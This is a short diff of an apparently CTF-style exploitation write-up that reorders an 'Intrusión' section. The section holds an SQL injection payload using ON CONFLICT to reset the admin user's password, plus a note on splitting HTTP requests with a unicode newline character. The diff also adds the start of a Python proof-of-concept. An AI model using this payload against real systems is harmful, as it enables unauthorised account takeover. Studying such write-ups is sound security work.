@@ -168,14 +168,15 @@ We can try to make additional http requests by truncating characters.
 \u010A —> \n
 ```
 ## Intrusión
-```sql
-‘) ON CONFLICT (username) DO UPDATE SET password = ‘passwd123’; —
-```
+
 Useful load
 
 Update password to admin user via sql query.
+```sql
+‘) ON CONFLICT (username) DO UPDATE SET password = ‘passwd123’; —
+```
 
-
+Write the POC
 ```py
    1   │ import requests
    2   │ 
